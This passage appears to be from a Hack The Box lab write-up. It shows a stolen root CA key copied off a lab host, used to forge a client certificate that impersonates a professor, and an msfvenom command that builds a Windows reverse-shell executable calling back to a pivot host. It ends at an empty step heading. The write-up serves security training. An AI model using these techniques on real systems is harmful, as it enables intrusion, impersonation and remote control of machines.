```

`wao` has full sudo rights on the target:

```console
wao@LAB-2:~$ sudo -l
[sudo] password for wao:
Matching Defaults entries for wao on LAB-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wao may run the following commands on LAB-2:
    (ALL : ALL) ALL
```

The `Downloads` directory in `wao`'s home directory looks like the developer work area for the university site, `rootCA.key` is found in this directory too:

```console
wao@LAB-2:~$ ls -lRa
.:
total 52
drwxr-xr-x 9 wao  wao  4096 Oct 21 17:09 .
drwxr-xr-x 5 root root 4096 Sep 14 03:45 ..
lrwxrwxrwx 1 root root    9 Sep 14 03:48 .bash_history -> /dev/null
-rw-r--r-- 1 wao  wao   220 Sep 13 11:08 .bash_logout
-rw-r--r-- 1 wao  wao  3771 Sep 13 11:08 .bashrc
drwx------ 2 wao  wao  4096 Sep 14 03:55 .cache
drwx------ 3 wao  wao  4096 Sep 14 07:21 .config
drwxrwxr-x 2 wao  wao  4096 Sep 14 06:41 Desktop
drwxrwxr-x 2 wao  wao  4096 Sep 14 06:42 Documents
drwxrwxr-x 9 wao  wao  4096 Sep 14 03:55 Downloads
drwx------ 3 wao  wao  4096 Sep 14 03:55 .gnupg
drwxrwxr-x 3 wao  wao  4096 Sep 14 07:32 .local
-rw-r--r-- 1 wao  wao   807 Sep 13 11:08 .profile
-rw-r--r-- 1 root root   66 Oct 21 17:09 .selected_editor
-rw-r--r-- 1 wao  wao     0 Sep 14 03:58 .sudo_as_admin_successful
⋮

./Downloads:
total 60
drwxrwxr-x 9 wao wao  4096 Sep 14 03:55 .
drwxr-xr-x 9 wao wao  4096 Oct 21 17:09 ..
drwxrwxr-x 2 wao wao  4096 Sep 14 03:55 CA
drwxrwxr-x 2 wao wao  4096 Sep 14 03:55 gunicorn-test
drwxrwxr-x 2 wao wao  4096 Sep 14 03:55 nginx
-rwxrwxr-x 1 wao wao 22616 Sep 14 03:55 proto-features.py
drwxrwxr-x 2 wao wao  4096 Sep 14 03:55 test
drwxrwxr-x 3 wao wao  4096 Sep 14 03:55 University-Linux
drwxrwxr-x 5 wao wao  4096 Sep 14 03:55 University-Prototype-23
drwxrwxr-x 3 wao wao  4096 Sep 14 03:55 University-Windows

./Downloads/CA:
total 20
drwxrwxr-x 2 wao wao 4096 Sep 14 03:55 .
drwxrwxr-x 9 wao wao 4096 Sep 14 03:55 ..
-rwxrwxr-x 1 wao wao 1399 Sep 14 03:55 rootCA.crt
-rwxrwxr-x 1 wao wao 1704 Sep 14 03:55 rootCA.key
-rwxrwxr-x 1 wao wao   42 Sep 14 03:55 rootCA.srl
⋮
```

## 5. Going back to the university site

### 5.1. Getting access to the university site

What is found so far:
- The university site accepts certificate-based authentication
- The list of existing professor accounts are found in the sqlite3 database
- The root CA certificate and key were found in `192.168.99.12`

→ Let's attempt to generate a certificate for one of the users

Transfer the root CA certificate and key over to Kali

```console
root@kali:~# proxychains -q scp wao@192.168.99.12:~/Downloads/CA/rootCA.crt .
--------------------------[!]WARNING[!]-----------------------------
|This LAB is created for web app features testing purposes ONLY....|
|Please DO NOT leave any critical information while this machine is|
|       accessible by all the "Web Developers" as sudo users       |
--------------------------------------------------------------------
wao@192.168.99.12's password:
rootCA.crt                                                                100% 1399   110.4KB/s   00:00

root@kali:~# proxychains -q scp wao@192.168.99.12:~/Downloads/CA/rootCA.key .
--------------------------[!]WARNING[!]-----------------------------
|This LAB is created for web app features testing purposes ONLY....|
|Please DO NOT leave any critical information while this machine is|
|       accessible by all the "Web Developers" as sudo users       |
--------------------------------------------------------------------
wao@192.168.99.12's password:
rootCA.key                                                                100% 1704   144.9KB/s   00:00
```

Generate user key and certificate using the email and name of a user found in the sqlite3 database as certificate subject:

```console
root@kali:~# openssl genpkey -algorithm ec -pkeyopt ec_paramgen_curve:P-384 -out george.key

root@kali:~# openssl req -new -key george.key -subj "/O=HTB University/CN=Any Name" -out george.csr

root@kali:~# openssl x509 -req -in george.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -days 3650 -sha256 -out george.pem
Certificate request self-signature ok
subject=emailAddress=george@university.htb, CN=george
```

Login to the university site with the certificate:

![image](https://github.com/user-attachments/assets/6941e7d2-af15-4ee3-898d-46d98ce580c3)

The access of a professor has 3 more functions in the dashboard:
- Create a New course
- Manage My Courses
- Change Public Key

![image](https://github.com/user-attachments/assets/f714bb04-734c-46c2-b18b-4f8e825baab1)

### 5.2. Generate GPG key

In the `Change Public Key` page: GPG is used to encrypt uploaded lectures and there's a hint suggesting that uploading a file may be interesting

> Please note that providing an invalid gpg file will prevent us from verifying the uploaded lectures in the feature and will cause errors...

![image](https://github.com/user-attachments/assets/962a9aec-7153-4e6b-9990-f148aa242cd1)

Generate a GPG key

```
root@kali:~# gpg --gen-key
gpg (GnuPG) 2.2.45; Copyright (C) 2024 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

gpg: directory '/root/.gnupg' created
gpg: keybox '/root/.gnupg/pubring.kbx' created
Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: george
Email address: george@university.htb
You selected this USER-ID:
    "george <george@university.htb>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: directory '/root/.gnupg/openpgp-revocs.d' created
gpg: revocation certificate stored as '/root/.gnupg/openpgp-revocs.d/7259C99F7B382E8FDCAB2E128385A74213589E22.rev'
public and secret key created and signed.

pub   rsa3072 2024-12-28 [SC] [expires: 2027-12-28]
      7259C99F7B382E8FDCAB2E128385A74213589E22
uid                      george <george@university.htb>
sub   rsa3072 2024-12-28 [E] [expires: 2027-12-28]


root@kali:~# gpg --export -a george > george.asc
```

![image](https://github.com/user-attachments/assets/b07d48dd-b049-44f6-befb-e1c47f8d1cb2)

![image](https://github.com/user-attachments/assets/43d3c850-5cfb-45ad-a15b-f80c22b423a5)

### 5.3. Getting a Shell

The `Manage My Courses` page shows the list of courses under the account:

![image](https://github.com/user-attachments/assets/85e87026-4f22-4822-ad52-dbe8b3a77c45)

Selecting `Learn More` on a course leads to `Add a new lecture`:

![image](https://github.com/user-attachments/assets/ac459d37-1271-4a09-b54b-a030e13bfe12)

This is very likely to be a "client-side" attack where an admin would open the attachment to inspect it
1. The target `WS-3` was found previously, where `wao` has user-level access to
2. The admin would probably be inspecting the attachment from `WS-3`, guessing that `WS` would mean "workstation"
3. `WS-3` is in the `192.168.99.12` subnet, which will likely not have connectivity to Kali → so the reverse shell listener should run on `LAB-2`

#### 5.3.1. Generate a reverse shell executable that points to `LAB-2`

```console
root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.99.12 LPORT=4444 -f exe -o /var/www/html/reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/reverse.exe
```

#### 5.3.2. Place the payload with the user-level access that `wao` has on `WS-3`

```pwsh

```

#### 5.3.3. 
